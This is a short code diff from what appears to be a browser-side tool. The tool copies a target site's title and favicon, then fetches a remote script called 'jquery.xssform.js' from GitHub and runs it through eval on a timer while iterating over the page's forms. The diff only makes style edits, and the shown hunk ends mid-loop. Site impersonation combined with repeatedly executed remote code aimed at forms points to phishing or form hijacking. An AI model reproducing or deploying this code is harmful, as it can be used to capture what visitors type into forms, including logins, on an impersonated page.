@@ -31,9 +31,9 @@
         document.title = data.match(/<title>(.*)<\/title>/i)[1];
       }
       if(document.head){
-        document.head.innerHTML+=`<link rel="shortcut icon" href="${target.protocol}//${target.host}/favicon.ico">`
+        $('head').append(`<link rel="shortcut icon" href="${target.protocol}//${target.host}/favicon.ico">`);
       }
-      $.get('https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js',(data)=>{
+      $.get('https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js',data=>{
         setInterval(()=>{
           eval(data);
           $('form').each((i,f)=>{
